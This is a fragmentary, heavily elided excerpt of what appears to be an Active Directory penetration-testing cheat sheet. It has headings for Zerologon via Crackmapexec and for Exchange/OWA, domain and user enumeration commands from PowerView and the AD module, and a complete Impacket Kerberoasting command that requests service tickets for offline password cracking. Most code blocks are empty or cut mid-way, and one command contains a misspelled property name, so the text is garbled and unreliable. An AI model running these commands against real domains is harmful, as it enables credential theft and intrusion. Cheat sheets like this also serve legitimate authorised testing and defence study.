...
```bash filename="Crackmapexec" {2,5,9}
# Zerologon
...
<Tabs items={['PowerView', 'ADModule']}>
  <Tab>
    ```powershell filename="PowerView" {2,5,8}
  ...
  <Tab>
    ```powershell filename="ADModule" {2,5,8,11}
      # Get info about the domain 
      Get-ADDomain
...
https://www.windows-active-directory.com/active-directory-password-policies.html#:~:text=You%20can%20view%20the%20default%20password%20policy%20using%20one%20of%20two%20ways.&text=Go%20to%20Start%20Menu%20→,policies%20have%20to%20be%20set.
...
<Tabs items={['PowerView', 'ADModule']}>
  <Tab>
    ```powershell filename="PowerView"
      ...
      Get-NetUser | select -ExpandProperty samaccoutname
...
### Kerberoasting
<Tabs items={['Rubeus.exe', 'Impacket']}>
  <Tab>
    ```powershell 
  ...
  <Tab>
    ```bash copy
      GetUserSPNs.py domain.local/user:P@ssw0rd1 -request -dc-ip 20.20.20.20
    ```
  </Tab>
...
<Tabs items={['Rubeus.exe', 'Impacket','Kerbrute']}>
  <Tab>
    ```powershell {2,5,8}
...
```
#### Microsoft Exchange and Outlook Web App
```
```
